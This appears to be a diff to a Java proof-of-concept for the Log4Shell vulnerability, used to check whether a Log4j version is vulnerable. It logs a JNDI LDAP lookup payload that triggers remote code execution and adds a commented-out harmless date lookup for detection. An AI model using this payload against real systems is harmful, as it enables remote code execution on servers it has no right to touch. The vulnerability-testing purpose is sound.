@@ -18,6 +18,10 @@ public class VulnerableLog4jExample {
 
   public static void main(String[] args) throws IOException {
     String attackString = "${jndi:ldap://127.0.0.6/a}";
+
+    // optional attackString that does not require wireshark to check if a library is vulnerable
+    //String attackString = "${date:YYYY-MM-dd}";
+
     // This line triggers the RCE by logging the attackString.
     log.info("Requesting :" + attackString);
   }
